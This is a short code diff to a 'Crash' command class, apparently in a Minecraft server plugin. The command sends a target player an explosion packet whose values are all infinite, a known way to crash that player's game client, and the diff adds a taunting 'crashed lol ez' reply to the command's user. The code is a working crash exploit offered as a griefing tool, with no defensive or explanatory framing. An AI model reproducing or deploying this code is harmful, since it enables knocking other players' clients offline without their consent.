@@ -26,5 +26,6 @@ public final class Crash extends CommandBase {
         }
         ClientboundExplodePacket packet = new ClientboundExplodePacket(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Float.POSITIVE_INFINITY, List.of(), new Vec3(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY));
         pp.SendPacket(packet);
+        p.Reply(pp.getName() + " crashed lol ez");
     }
 }
